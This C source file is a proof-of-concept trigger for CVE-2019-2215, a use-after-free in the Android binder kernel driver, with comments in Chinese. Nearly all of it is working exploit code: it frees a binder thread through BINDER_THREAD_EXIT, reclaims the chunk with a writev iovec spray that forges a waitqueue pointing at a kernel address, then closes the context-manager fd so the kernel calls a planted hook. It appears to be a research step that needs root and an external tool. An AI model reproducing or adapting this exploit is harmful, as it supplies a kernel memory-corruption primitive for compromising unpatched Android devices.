/*
 * CVE-2019-2215 wake 路径触发链（P2.10 §2.3 设计）
 *
 * 同进程两 fd：
 *   fd2 → context_mgr（proc2）；fd1 → proc1，其线程 A 发同步事务给 context mgr
 *   → t->from = A，t 入 proc2->todo（proc2 无 WAITING 线程）
 *   → A 的 THREAD_EXIT 只清 A 自己的 transaction_stack（空），t->from 悬空 → kfree(A)
 *   → writev(32 iovec) kmalloc(256) 重占位 A chunk，伪造 waitqueue：
 *       chunk+0x2c lock=0（ticket 空闲）, chunk+0x30 next→内核 fake wqt
 *   → close(fd2) → deferred workqueue → binder_release_work → send_failed_reply(t)
 *       → target_thread = t->from（悬空 A）→ wake_up_interruptible(&A->wait)
 *       → __wake_up_common 遍历伪造链 → func = 内核 hook（log 区）
 *
 * fake 链必须在内核地址（kworker 上下文，无我们的 mm）。
 * hook 与 fake wqt 由外部 ktool 预写：
 *   c0a88000: ldr r1,[pc,#8]; mov r0,#0x40; str r0,[r1]; bx lr ; .word c0a88020
 *   c0a88100: .word 1 (flags=EXCLUSIVE), c0a88000 (func), c0a88100 (next), 0 (prev)
 * 观测：程序结束后 ktool dump c0a88020 → 40000000 = wake 路径实锤
 *
 * 用法: binder_wake   （须 root：ktool sh -c "..."）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>

#define BINDER_WRITE_READ   0xc0186201UL
#define BINDER_VERSION      0xc0046209UL
#define BINDER_SET_CTXMGR   0x40046207UL
#define BINDER_THREAD_EXIT  0x40046208UL
#define BC_TRANSACTION      0x40286300UL

struct binder_write_read {
	int32_t  write_size, write_consumed;
	uint32_t write_buffer;
	int32_t  read_size, read_consumed;
	uint32_t read_buffer;
};

struct binder_transaction_data {
	union { uint32_t handle; uint32_t ptr; } target;
	uint32_t cookie;
	uint32_t code;
	uint32_t flags;
	int32_t  sender_pid;
	uint32_t sender_euid;
	uint32_t data_size;
	uint32_t offsets_size;
	union {
		struct { uint32_t buffer; uint32_t offsets; } ptr;
		uint8_t buf[8];
	} data;
};

static struct iovec g_iov[32];
static int g_lf = -1;

static void lg(const char *fmt, ...)
{
	char buf[256];
	va_list ap;
	int n;
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (n > 0) {
		write(1, buf, n);
		if (g_lf >= 0) { write(g_lf, buf, n); fsync(g_lf); }
	}
}

static int bwr(int fd, void *wb, int ws, void *rb, int rs)
{
	struct binder_write_read b;
	memset(&b, 0, sizeof b);
	b.write_size = ws; b.write_buffer = (uint32_t)(uintptr_t)wb;
	b.read_size  = rs; b.read_buffer  = (uint32_t)(uintptr_t)rb;
	return ioctl(fd, BINDER_WRITE_READ, &b);
}

/* BC_TRANSACTION → context mgr（handle 0），同步（非 one-way），小数据 */
static int send_txn(int fd, void *data, int dsize)
{
	uint8_t wb[4 + sizeof(struct binder_transaction_data)];
	struct binder_transaction_data *tr = (void *)(wb + 4);

	memset(wb, 0, sizeof wb);
	*(uint32_t *)wb = BC_TRANSACTION;
	memset(tr, 0, sizeof *tr);
	tr->target.handle = 0;                      /* context mgr node */
	tr->data_size = dsize;
	tr->data.ptr.buffer = (uint32_t)(uintptr_t)data;
	return bwr(fd, wb, sizeof wb, NULL, 0);
}

int main(void)
{
	int fd1, fd2, i, r, pipew;
	void *map1, *map2, *dat;
	uint8_t payload[16];
	int zero = 0;

	g_lf = open("/data/local/tmp/bw.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	setvbuf(stdout, NULL, _IONBF, 0);
	lg("=== binder_wake pid=%d uid=%d ===\n", getpid(), getuid());

	/* ---------- [1] 两个 binder proc ---------- */
	fd1 = open("/dev/binder", O_RDWR);
	fd2 = open("/dev/binder", O_RDWR);
	if (fd1 < 0 || fd2 < 0) { lg("[!] open errno=%d\n", errno); return 1; }
	map1 = mmap(NULL, 0x400000, PROT_READ, MAP_PRIVATE, fd1, 0);
	map2 = mmap(NULL, 0x400000, PROT_READ, MAP_PRIVATE, fd2, 0);
	lg("[1] fd1=%d map1=%p fd2=%d map2=%p\n", fd1, map1, fd2, map2);

	/* ---------- [2] fd2 当 context mgr（需 root） ---------- */
	r = ioctl(fd2, BINDER_SET_CTXMGR, &zero);
	lg("[2] set_ctxmgr r=%d errno=%d\n", r, errno);
	if (r != 0) { lg("[!] 需要 root 或已被占用\n"); return 2; }

	/* ---------- [3] iovec spray 布局 ---------- */
	{
		int pfd[2];
		static char fill[4096];
		int total = 0;
		if (pipe(pfd)) { lg("[!] pipe errno=%d\n", errno); return 3; }
		pipew = pfd[1];
		fcntl(pipew, F_SETFL, O_NONBLOCK);
		for (;;) { int n = write(pipew, fill, sizeof fill); if (n <= 0) break; total += n; }
		fcntl(pipew, F_SETFL, 0);
		lg("[3] pipe filled=%d\n", total);
	}

	dat = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
	           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (dat == MAP_FAILED) { lg("[!] dat errno=%d\n", errno); return 4; }
	memset(dat, 0, 0x4000);

	for (i = 0; i < 32; i++) {
		g_iov[i].iov_base = (void *)((char *)dat + 0x800);
		g_iov[i].iov_len  = 0x40;
	}
	/* binder_thread.wait @ +0x2c（12B：lock/next/prev），对应 iov[5..7] 区域：
	 *   chunk+0x2c lock        = iov[5].iov_len  → 0（ticket 空闲）
	 *   chunk+0x30 next        = iov[6].iov_base → 内核 fake wqt (c0a88100)
	 *   chunk+0x34 prev        = iov[6].iov_len  → 0 */
	g_iov[5].iov_len  = 0;
	g_iov[6].iov_base = (void *)0xc0a88100UL;
	g_iov[6].iov_len  = 0;
	lg("[4] iov: lock=0 next=%p\n", g_iov[6].iov_base);

	/* ---------- [5] A 发同步事务给 context mgr ---------- */
	memset(payload, 0x41, sizeof payload);
	r = send_txn(fd1, payload, sizeof payload);
	lg("[5] send_txn r=%d errno=%d (t->from=A, 入 proc2->todo)\n", r, errno);
	if (r != 0) { lg("[!] send_txn 失败 errno=%d\n", errno); return 5; }

	/* ---------- [6] A 退出：t->from 悬空 → kfree(A) ---------- */
	r = ioctl(fd1, BINDER_THREAD_EXIT, NULL);
	lg("[6] thread_exit r=%d errno=%d\n", r, errno);

	/* ---------- [7] iovec spray 抢 chunk ---------- */
	{
		ssize_t nw = writev(pipew, g_iov, 32);
		lg("[7] writev=%zd errno=%d\n", nw, errno);
	}

	/* ---------- [8] close fd2 → workqueue → wake UAF ---------- */
	close(fd2);
	lg("[8] fd2 closed, 等 workqueue...\n");
	sleep(1);
	lg("[9] done —— 外部验证: ktool dump c0a88020 8 (期望 40000000)\n");
	return 0;
}
